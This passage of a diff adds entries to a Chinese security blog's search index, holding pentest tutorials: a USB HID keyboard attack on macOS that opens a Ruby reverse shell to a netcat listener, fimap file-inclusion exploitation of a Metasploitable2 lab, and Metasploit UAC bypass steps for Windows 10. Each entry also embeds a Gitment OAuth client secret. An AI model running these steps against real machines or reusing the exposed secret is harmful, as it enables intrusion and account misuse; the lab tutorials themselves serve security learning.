丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中&nbsp;使用以下命令,并且打开记事本。&nbsp;&nbsp;得到最终会话&nbsp;&nbsp;&nbsp;视频资料：https://www.youtube.com/watch?v=GT9nBuXatmU InjectProc | Process Injection Techniques | Malwarehttps://www.pinterest.com/penetrationtesting/https://github.com/secrary/InjectProc github var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>Metasploit</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[黑手第三篇----DuckHunterHID for mac]]></title>
+    <url>%2FDuckHunterHID.html</url>
+    <content type="text"><![CDATA[继上一篇nethunter 的HID键盘攻击之后，我打算在我的mac上进行HID攻击，（http://www.ggsec.cn/nethuner-HID.html ） 这次使用到的是USB-DuckHunter-HID，下面请看背景知识回顾—————–》&nbsp; 0x00 HID 键盘攻击在这个视频键盘HID攻击被证明。它可以在几秒钟内通过USB将目标解锁机器。它通过模拟键盘和鼠标，盲目地键入受控命令，轻击鼠标指针并使鼠标点击武器。这是什么？几乎每台包括台式机，笔记本电脑，平板电脑和智能手机的电脑都通过键盘输入人类。这就是为什么有一个称为HID或人机接口设备的无处不在的USB标准的规范。简单地说，声称是Keyboard HID的任何USB设备将被大多数现代操作系统自动检测和接受。无论是Windows，Mac，Linux还是Android设备，键盘都是King。 通过利用这种固有的信任，脚本敲击的速度超过每分钟1000字，传统的对策可以被这个不知疲倦的骑兵绕过 - USB攻击。&nbsp;&nbsp; DuckHunter HIDDuckHunter HID选项允许您快速方便地将USB Rubber Ducky脚本转换为NetHunter HID攻击格式。您可以从示例预设菜单中选择一个选项，或从Duck Toolkit站点中选择更多选择的预配置脚本。进攻安全人员再次出现。受欢迎的Pentesting发行版Kali Linux的构建者为Android设备推出了一款名为Kali NetHunter的新工具。该工具是一种移动分销，旨在在Android手机上安装并运行时通过USB危及系统。 该工具可以通过HID风格的攻击伪装成键盘，发出命令以打开其他攻击中的管理外壳，包括BadUSB中间人风格的攻击。该工具的图片目前可用于Nexus设备，但其他Android设备的构建可能正在进行中。&nbsp; &nbsp;&nbsp; 0x01 首先我们来看下，黑手（kali_nethunter）的duck_HID 给我们提供了哪些默认的脚本。 首先呢 我们可以看到在nethunter客户端上可以看到有（DuckHunter HID ）字样，其实他就是模拟黄鸭，USB Rubber Ducky脚本转换为NetHunter HID攻击格式。&nbsp;&nbsp;&nbsp;&nbsp;在默认的选项我们可以看到他给我们提供了默认的几个选项，其中有两个脚本呢 是针对Mac OSX 的HID攻击，攻击后呢返回一个shell连接，这里其中有perl和Ruby两个脚本，我们就选择其中一个选择ruby。&nbsp;&nbsp;0x02选择ruby脚本。我们来简单的看下代码的意思&nbsp;&nbsp;0X031.COMMAND SPACE—–在mac的快捷键表示为搜索框搜索&nbsp;2.STRING terminal ENTER——–输入字符串terminal 搜索终端，并按下回车&nbsp;3.Command+n就是新建的快捷键，功能是新建一个项目，在不同程序有不同的新建项目种类。&nbsp;4.在终端下输入字符串使用ruby socket建立服务端&nbsp;5.当然了在这段代码也我们提示了 使用netcat（nc ）建立监听 并返回会话，他这里0.0.0.0提示我们更改我们黑手nethunter的ip地址。如：查看黑手使用的ip&nbsp;&nbsp;更改ip&nbsp;&nbsp;保存脚本&nbsp;&nbsp;0X041.并且在终端中使用nc命令建立监听 ———nc -vv -l -p 1337 &nbsp;&nbsp;2 .点击三角按钮，执行攻击。 &nbsp;&nbsp;3.返回shell连接&nbsp;&nbsp;&nbsp;&nbsp;最终结果：&nbsp;&nbsp;更多项目可在github–USBDucky 项目中寻找你需要的PAYLOAD。https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads&nbsp;&nbsp; 视频演示可观看个人演示的视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/DuckHunterHID.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Fimap_Metasploitable2漏洞攻击]]></title>
+    <url>%2Ffimap_metasploitable2%20.html</url>
+    <content type="text"><![CDATA[简介Fimap是一款本地及远程的文件包含漏洞检测工具，并能对检测到的漏洞进行利用，带了一个google的语法搜索功能，这款工具只针对文件包含漏洞的检测及利用.&nbsp;&nbsp;本次使用到的环境：docker_kali 攻击者 metasploitable2 靶机环境&nbsp; kali中自带的工具:fimap&lt;p&gt; -H，--harvest 模式为新URL收集URL。 需要一个根网址（-u）开始在那里爬网。 还需要（-w）为质量模式编写URL列表 &amp;nbsp; -d，--depth = CRAWLDEPTH 您希望在收获模式（-H）下爬网目标网站的CRAWLDEPTH（递归级别）。默认值为1. &amp;nbsp; -x，--exploit 启动一个交互式会话，您可以在其中, 选择一个目标并执行某些操作 &amp;nbsp; -C，--enable-color --force-run忽略实例检查，只要运行fimap。&lt;/p&gt; &amp;nbsp; 例子： 1. 简单扫描 ./fimap.py -u &apos;http://localhost/test.php?file=bang&amp;id=23&apos; 2. 使用列表进行扫描 ./fimap.py -m -l &apos;/tmp/urllist.txt&apos; 3. 使用谷歌语法搜索 ./fimap.py -g -q &apos;inurl:include.php&apos; 4. 收集递归等级为3和的网页的所有链接 将URL写入 /tmp/urllist ./fimap.py -H -u &apos;http://localhost&apos; -d 3 -w /tmp/urllist 参考资料：http://tools.kali.org/web-applications/fimap 视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/fimap_metasploitasble2.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;1.本次使用到的是metaspolitable2 靶机环境 ，我们打开浏览器输入该靶机的 ip&nbsp;&nbsp;&nbsp;&nbsp;2.使用fimap的例子4 进行尝试检测 ： fimap -H -u http://localhost -d 3 -w /tmp/urllist &nbsp; &nbsp; 3.在上图中可以看到，对dvwa/dav/twiki/等进行扫描，图中对Mutillidae扫描的列表比较多。 mutillidae是一个免费，开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。它是由Adrian “Irongeek” Crenshaw和Jeremy “webpwnized” Druin.开发的一款自由和开放源码的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等.对检测到的漏洞进行攻击，并忽略实例检查： fimap -x –force-run &nbsp; &nbsp; 4.填写目标序列号1 。进入漏洞url列表，选择漏洞id 如选择1。 &nbsp; &nbsp;5、执行攻击 选择攻击模式。如选择1 &nbsp; &nbsp; 使用fimap 反弹shell 得到回话、 &nbsp; &nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[metaspolit_bypassuac_win10]]></title>
+    <url>%2Fbypassuac-win10.html</url>
+    <content type="text"><![CDATA[视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/win10_bypassUAC.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;当你得一个meterpreter会话，却提不了权怎么办？？Demon：嘚吧嘚————此方法只能绕过本机防护机制，但是绕不过360等。以及此模块需更新最新版即可&nbsp; 第一步：搜索 bypassuac msf exploit(web_delivery) &gt; search bypassuac &nbsp; &nbsp; &nbsp; 第二步: 使用提权模块，进行对windows uac绕过。 msf exploit(web_delivery) &gt; use exploit/windows/local/bypassuac_eventvwr &nbsp; &nbsp; &nbsp;/// 查看模块选项 msf exploit(bypassuac_eventvwr) &gt; options Module options (exploit/windows/local/bypassuac_eventvwr): Name Current Setting Required Description SESSION yes The session to run this module on. Exploit target: Id Name 0 Windows x86/////////////&nbsp;&nbsp;&nbsp; 第三步： 设置回话 （比如说我这里的话说是1）那就设置1 msf exploit(bypassuac_eventvwr) &gt; set SESSION 1 SESSION =&gt; 1 &nbsp; &nbsp; &nbsp; 第四步： 执行exploit，执行提权。 msf exploit(bypassuac_eventvwr) &gt; exploit &nbsp;&nbsp;&nbsp; 第五步 ：查看会话，在这里你可以发现有2个回话。 msf exploit(bypassuac_eventvwr) &gt; sessions &nbsp;&nbsp;&nbsp; 第六步：进入会话2。进入meterpreter会话，进行进一步的提权操作.以及下面是提权前普通用户和 提权后system 最高权限对比！ &nbsp;&nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container') 视频中相关代码可复制代码可直接复制！！！ 代码可直接复制！！！ 代码可直接复制！！！ 代码可直接复制！！！！ &nbsp;]]></content>
+      <categories>
+        <category>Metasploit</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[新增提问板块]]></title>
+    <url>%2FDiscuss1.html</url>
+    <content type="text"><![CDATA[&nbsp; 这次新开了一个目的也是一个 增加一个留言板块，增进探讨和提问解决 与更多人参与讨论，方便一起解决,有什么问题可以交个我来进行生成md文档 ，上传本次问题，与更多朋友参与一起讨论探讨，方便解决问题！！ Demon 2017.9.12 &nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>提问板块</category>
+      </categories>
+      <tags>
+        <tag>提问板块</tag>
+      </tags>
+  </entry>
 </search>
